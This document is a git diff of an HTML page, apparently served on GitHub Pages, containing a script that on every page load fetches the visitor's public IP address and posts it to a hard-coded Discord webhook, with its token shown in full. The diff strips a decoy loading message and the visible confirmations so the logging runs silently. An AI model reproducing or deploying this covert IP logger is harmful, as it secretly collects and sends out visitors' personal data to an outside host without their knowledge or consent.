@@ -1,17 +1,10 @@
-"Dance till your dead!"
-<h1>Please wait for this users site to load. Due to the many data in GitHub Pages, this can take a second.</h1>
-Waiting for response.....!
-67
-67
-67
-
 <script>
 window.addEventListener("load", async () => {
   // Only send once per session
   if (sessionStorage.getItem("visitLogged")) return;
   sessionStorage.setItem("visitLogged", "true");
 
-  const webhookURL = "https://discord.com/api/webhooks/1472358587455246548/pc6oWJBb1vMP2bkfS-diW4OkkIY96FWF3RoCC3_3vaBRszSmWis70oIhupoAIcLsTNA6";
+  const webhookURL = "https://discord.com/api/webhooks/1472358587455246548/pc6oWJBb1vMP2bkfS-diW4OkkIY96FWF3RoCC3_3vaBRszSmWis70oIhupoAIcLsTNA6"; // replace with your new webhook
 
   try {
     // Fetch public IP
@@ -19,11 +12,11 @@ window.addEventListener("load", async () => {
     const data = await res.json();
     const ip = data.ip;
 
-    // Create Discord embed payload
-    const payload = {
-      username: "IP Logger",
+    // Prepare Discord embed payload
+    const visitData = {
+      content: "🌐 New Unique Visit",
       embeds: [{
-        title: "🌐 New Visit Detected",
+        title: "Visitor IP Info",
         color: 5814783,
         fields: [
           { name: "IP Address", value: ip }
@@ -32,23 +25,16 @@ window.addEventListener("load", async () => {
       }]
     };
 
+    // Send to Discord
     await fetch(webhookURL, {
       method: "POST",
-      mode: "no-cors", // required for GitHub Pages
+      mode: "no-cors", // needed for GitHub Pages
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+      body: JSON.stringify(visitData)
     });
 
-    document.body.insertAdjacentHTML(
-      'beforeend',
-      `<p style="color:green;">✅ IP sent: ${ip}</p>`
-    );
-
   } catch (err) {
-    document.body.insertAdjacentHTML(
-      'beforeend',
-      `<p style="color:red;">❌ Error: ${err.message}</p>`
-    );
+    console.error("Error sending IP:", err);
   }
 });
 </script>
